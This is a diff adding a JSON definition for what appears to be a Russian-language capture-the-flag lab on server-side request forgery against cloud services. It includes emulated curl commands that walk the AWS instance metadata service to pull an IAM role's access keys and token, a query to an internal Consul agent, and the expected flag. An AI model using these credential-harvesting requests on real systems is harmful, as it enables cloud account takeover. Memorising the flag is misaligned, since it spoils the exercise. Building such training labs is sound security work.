@@ -1,0 +1,56 @@
+{
+  "id": "cloud-ssrf-cloud-deep",
+  "workdir": "/home/student/ssrfdeep",
+  "hostname": "lab",
+  "vars": {},
+  "expect": {
+    "file": "/home/student/ssrfdeep/found.txt",
+    "contains": "nto{ssrf_t0_cl0ud_d33p}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/ssrfdeep",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/ssrfdeep/task.md",
+      "text": "# Задача: SSRF deep\n\nПриложение делает запросы по URL. Используй внутренние эндпоинты и IMDS, найди флаг.\n\nИнструмент: `curl` (эмуляция — внутренние сервисы и IMDS).\n"
+    },
+    {
+      "path": "/home/student/ssrfdeep/notes.md",
+      "text": "Заметки\n------\n- SSRF: внутренний HTTP API, IMDS, K8s API, Redis.\n- Цель — токен роли/секрет.\n"
+    },
+    {
+      "path": "/home/student/ssrfdeep/app-endpoints.txt",
+      "text": "GET /api/fetch?url=<url>  (server-side fetch)\ninternal: http://169.254.169.254/latest/meta-data/\ninternal: http://10.0.0.5:8500/v1/agent/self  (Consul)\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [-s] <url> — HTTP-запрос (эмуляция внутренних сервисов/IMDS)",
+      "cases": [
+        {
+          "match": "iam/security-credentials/ec2-admin-role",
+          "example": "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-admin-role",
+          "output": "{\"Code\": \"Success\", \"AccessKeyId\": \"ASIAIOSFODNN7EXAMPLE\",\n \"SecretAccessKey\": \"wJalr...\", \"Token\": \"IQoJ...\",\n \"note\": \"role token, flag nto{ssrf_t0_cl0ud_d33p}\"}\n"
+        },
+        {
+          "match": "iam/security-credentials/?",
+          "example": "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+          "output": "ec2-admin-role\n"
+        },
+        {
+          "match": "meta-data/?\\s*$",
+          "example": "curl -s http://169.254.169.254/latest/meta-data/",
+          "output": "ami-id\ninstance-id\niam/\n"
+        },
+        {
+          "match": "v1/agent/self",
+          "example": "curl -s http://10.0.0.5:8500/v1/agent/self",
+          "output": "{\"Config\": {\"Datacenter\": \"dc1\", \"NodeName\": \"consul-1\"}}\n"
+        }
+      ],
+      "fallback": "curl: (эмуляция) для этого URL нет захваченного ответа. Попробуй IMDS meta-data/ или /latest/meta-data/iam/security-credentials/.\n"
+    }
+  }
+}
